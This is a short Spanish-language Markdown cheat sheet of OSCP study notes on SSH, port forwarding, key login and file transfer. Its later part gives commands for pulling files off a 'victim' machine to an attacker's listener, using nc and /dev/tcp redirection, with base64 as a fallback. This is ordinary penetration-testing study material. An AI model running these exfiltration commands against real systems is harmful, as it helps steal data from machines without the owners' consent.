# Apuntes-OSCP

## SSH
```bash
 ssh -p22 usuario@host_remoto
```
#### reenvio de puertos
```bash
 ssh -L [PUERTO_LOCAL]:[HOST_REMOTO]:[PUERTO_REMOTO] usuario@host_remoto
```
#### Inicio de sesion con id_rsa
El id_rsa debe tener el siguiente permiso
```bash
 chmod 600 id_rsa
```
```bash
 ssh -i id_rsa usuario@host_remoto
```
### SCP y transferencia de archivos
#### Maneras posibles de pasar archivos
Traer el archivo a mi maquina con scp
```bash
 scp target_user@IP_remota:/ruta/completa/al/archivo .
```
Traer archivos con nc (cuando no dispongo contraseña)
</br>en la mquina victima
```bash
nc 19.10.10.10 9091 < archivo
```
luego en mi maquina
```bash
nc -lvnp 9091 > archivo
```
Cuando no es posible, ej: una BD, entonces
```bash
base64 filename > outputfile.b64
```
Sino tambien
```bash
echo -n 'texto' | base64
```
Luego en mi maquina
```bash
base64 -d encodedfile.b64 > outputfile
```
Otra Alternativa es
```bash
cat file.txt > /dev/tcp/192.168.1.23/4444 # on victim linux
```
```bash
nc -lvp 4444 > file.txt # on Kali
```
